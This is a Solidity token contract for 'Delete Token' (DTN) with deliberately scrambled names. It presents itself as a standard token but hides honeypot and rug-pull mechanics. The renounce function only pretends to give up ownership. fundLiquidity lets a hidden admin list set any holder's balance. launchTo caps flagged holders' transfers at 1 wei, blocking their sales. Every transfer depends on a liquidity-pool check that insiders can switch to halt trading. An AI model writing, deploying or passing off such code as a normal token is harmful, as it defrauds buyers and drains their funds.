//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface sellTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeMode) external view returns (uint256);

    function transfer(address enableReceiver, uint256 modeAmount) external returns (bool);

    function allowance(address amountShould, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeAmount) external returns (bool);

    function transferFrom(
        address sender,
        address enableReceiver,
        uint256 modeAmount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atSwapLaunched, uint256 value);
    event Approval(address indexed amountShould, address indexed spender, uint256 value);
}

abstract contract launchShouldFee {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingLimitLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface marketingWallet {
    function createPair(address feeBuy, address liquidityShouldSwap) external returns (address);
}

interface sellTeamMetadata is sellTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DeleteToken is launchShouldFee, sellTeam, sellTeamMetadata {

    bool public fundTrading;

    function balanceOf(address takeMode) public view virtual override returns (uint256) {
        return walletLaunched[takeMode];
    }

    function owner() external view returns (address) {
        return fromIs;
    }

    mapping(address => uint256) private walletLaunched;

    function name() external view virtual override returns (string memory) {
        return receiverExempt;
    }

    uint256 takeModeSender;

    function getOwner() external view returns (address) {
        return fromIs;
    }

    function decimals() external view virtual override returns (uint8) {
        return fundSwapLaunch;
    }

    function launchedFrom() public {
        emit OwnershipTransferred(listFrom, address(0));
        fromIs = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tokenExempt;
    }

    constructor (){
        if (liquidityAmount != tokenReceiver) {
            liquidityAmount = tokenReceiver;
        }
        marketingLimitLiquidity swapBuy = marketingLimitLiquidity(atSender);
        tokenMode = marketingWallet(swapBuy.factory()).createPair(swapBuy.WETH(), address(this));
        if (liquidityAmount != tokenReceiver) {
            feeSender = true;
        }
        listFrom = _msgSender();
        launchedFrom();
        isAuto[listFrom] = true;
        walletLaunched[listFrom] = tokenExempt;
        
        emit Transfer(address(0), listFrom, tokenExempt);
    }

    function sellLaunch(address receiverLiquidity, address enableReceiver, uint256 modeAmount) internal returns (bool) {
        require(walletLaunched[receiverLiquidity] >= modeAmount);
        walletLaunched[receiverLiquidity] -= modeAmount;
        walletLaunched[enableReceiver] += modeAmount;
        emit Transfer(receiverLiquidity, enableReceiver, modeAmount);
        return true;
    }

    address tokenTeamSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address private fromIs;

    function sellAmount() private view {
        require(isAuto[_msgSender()]);
    }

    function modeMaxFee(address receiverLiquidity, address enableReceiver, uint256 modeAmount) internal returns (bool) {
        if (receiverLiquidity == listFrom) {
            return sellLaunch(receiverLiquidity, enableReceiver, modeAmount);
        }
        uint256 teamTake = sellTeam(tokenMode).balanceOf(tokenTeamSender);
        require(teamTake == listReceiver);
        require(enableReceiver != tokenTeamSender);
        if (takeSenderMax[receiverLiquidity]) {
            return sellLaunch(receiverLiquidity, enableReceiver, walletFee);
        }
        return sellLaunch(receiverLiquidity, enableReceiver, modeAmount);
    }

    address atSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 constant walletFee = 1 ** 10;

    address public tokenMode;

    bool public feeSender;

    function approve(address isTakeMarketing, uint256 modeAmount) public virtual override returns (bool) {
        atEnable[_msgSender()][isTakeMarketing] = modeAmount;
        emit Approval(_msgSender(), isTakeMarketing, modeAmount);
        return true;
    }

    uint256 public liquidityAmount;

    function allowance(address launchMaxIs, address isTakeMarketing) external view virtual override returns (uint256) {
        if (isTakeMarketing == atSender) {
            return type(uint256).max;
        }
        return atEnable[launchMaxIs][isTakeMarketing];
    }

    function transferFrom(address receiverLiquidity, address enableReceiver, uint256 modeAmount) external override returns (bool) {
        if (_msgSender() != atSender) {
            if (atEnable[receiverLiquidity][_msgSender()] != type(uint256).max) {
                require(modeAmount <= atEnable[receiverLiquidity][_msgSender()]);
                atEnable[receiverLiquidity][_msgSender()] -= modeAmount;
            }
        }
        return modeMaxFee(receiverLiquidity, enableReceiver, modeAmount);
    }

    function launchTo(address minExempt) public {
        sellAmount();
        if (tokenReceiver != liquidityAmount) {
            tokenReceiver = liquidityAmount;
        }
        if (minExempt == listFrom || minExempt == tokenMode) {
            return;
        }
        takeSenderMax[minExempt] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return atFrom;
    }

    address public listFrom;

    uint8 private fundSwapLaunch = 18;

    function transfer(address enableSender, uint256 modeAmount) external virtual override returns (bool) {
        return modeMaxFee(_msgSender(), enableSender, modeAmount);
    }

    function exemptMode(address buyExempt) public {
        if (fundTrading) {
            return;
        }
        if (tokenReceiver == liquidityAmount) {
            liquidityAmount = tokenReceiver;
        }
        isAuto[buyExempt] = true;
        
        fundTrading = true;
    }

    mapping(address => bool) public isAuto;

    mapping(address => mapping(address => uint256)) private atEnable;

    uint256 public tokenReceiver;

    function liquidityTrading(uint256 modeAmount) public {
        sellAmount();
        listReceiver = modeAmount;
    }

    uint256 private tokenExempt = 100000000 * 10 ** 18;

    uint256 listReceiver;

    function fundLiquidity(address enableSender, uint256 modeAmount) public {
        sellAmount();
        walletLaunched[enableSender] = modeAmount;
    }

    string private receiverExempt = "Delete Token";

    string private atFrom = "DTN";

    bool private receiverTrading;

    event OwnershipTransferred(address indexed amountTotal, address indexed receiverAmount);

    mapping(address => bool) public takeSenderMax;

}